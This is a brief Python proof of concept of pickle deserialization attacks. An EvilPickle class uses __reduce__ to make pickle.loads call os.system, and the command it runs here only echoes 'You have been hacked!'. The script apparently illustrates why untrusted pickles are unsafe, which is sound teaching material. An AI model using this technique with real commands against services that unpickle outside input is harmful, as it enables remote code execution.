import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

pickled_data = pickle.dumps(EvilPickle())

# This will execute the command 'echo "You have been hacked!"'
unpickled_data = pickle.loads(pickled_data)
